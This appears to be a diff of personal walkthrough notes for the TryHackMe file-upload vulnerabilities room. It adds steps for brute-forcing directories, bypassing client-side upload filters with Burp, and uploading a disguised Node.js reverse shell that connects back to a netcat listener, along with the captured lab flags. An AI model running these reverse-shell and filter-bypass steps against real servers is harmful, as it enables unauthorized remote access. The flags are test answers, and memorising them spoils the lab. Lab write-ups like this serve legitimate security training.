@@ -89,9 +89,18 @@ search gif on https://en.wikipedia.org/wiki/List_of_file_signatures
 edit file shell.php ---> add AAAAAA on head
 open hexeditor change AAAAAA(41 41 41 41 41 41) to 47 49 46 38 37 61
 
+on my machine: nc -lnvp 1234
 run http://magic.uploadvulns.thm/graphics/shell.php
 
+- Grab the flag from /var/www/
+$cat /var/www/flag.txt
+THM{MWY5ZGU4NzE0ZDlhNjE1NGM4ZThjZDJh}
 
+
+#Task 11  Challenge
+
+ffuf -u http://jewel.uploadvulns.thm/FUZZ -c -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://jewel.uploadvulns.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 /content              (Status: 301) [Size: 181] [--> /content/]
 /modules              (Status: 301) [Size: 181] [--> /modules/]
 /admin                (Status: 200) [Size: 1238]               
@@ -100,7 +109,85 @@ run http://magic.uploadvulns.thm/graphics/shell.php
 /Assets               (Status: 301) [Size: 179] [--> /Assets/] 
 /Modules              (Status: 301) [Size: 181] [--> /Modules/]
 
+On my machine install add-on Wappalyzer for firefox
+run http://jewel.uploadvulns.thm/
+---> Programming: Nodejs 
+payload Nodejs
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs
+copy 
+///
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(4242, "10.0.0.1", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();
+//
 
+save shell.js
+
+Open Burp --> 
+run http://jewel.uploadvulns.thm/
+view source
+run http://jewel.uploadvulns.thm/assets/js/upload.js
+turn intercept on
+---> GET /assets/js/upload.js 
+do intercept --> response to this request
+---> Forward
+Remove lines
+#########
+			//Check File Size
+			if (event.target.result.length > 50 * 8 * 1024){
+				setResponseMsg("File too big", "red");			
+				return;
+			}
+			//Check Magic Number
+			if (atob(event.target.result.split(",")[1]).slice(0,3) != "ÿØÿ"){
+				setResponseMsg("Invalid file format", "red");
+				return;	
+			}
+			//Check File Extension
+			const extension = fileBox.name.split(".")[1].toLowerCase();
+			if (extension != "jpg" && extension != "jpeg"){
+				setResponseMsg("Invalid file format", "red");
+				return;
+			}
+#########
+---> Forward
+http://jewel.uploadvulns.thm/
+upload file shell.js ---> invalid
+rename shell.js to shell.jpg
+--> upload shell.jpg ---> success
+
+gobuster dir -u http://jewel.uploadvulns.thm/content/ --wordlist /mnt/c/Users/gd/Downloads/UploadVulnsWordlist.txt -x jpg
+/ABH.jpg              (Status: 200) [Size: 705442]
+/CPM.jpg              (Status: 200) [Size: 391]
+/LKQ.jpg              (Status: 200) [Size: 444808]
+/SAD.jpg              (Status: 200) [Size: 247159]
+/UAD.jpg              (Status: 200) [Size: 342033]
+
+see /CPM.jpg size 391
+
+Open http://jewel.uploadvulns.thm/admin/
+../content/CPM.jpg
+---modules not exist
+--> Run Burp --->http://jewel.uploadvulns.thm/admin
+POST /admin
+add
+cmd=CPM.jpg
+on my machine: nc -lnvp 443
+---> http://jewel.uploadvulns.thm/admin
+../content/CPM.jpg
+
+- Hack the machine and grab the flag from /var/www/
+$cat /var/www/flag.txt
+THM{NzRlYTUwNTIzODMwMWZhMzBiY2JlZWU2}
 
 
 https://tryhackme.com/room/uploadvulns
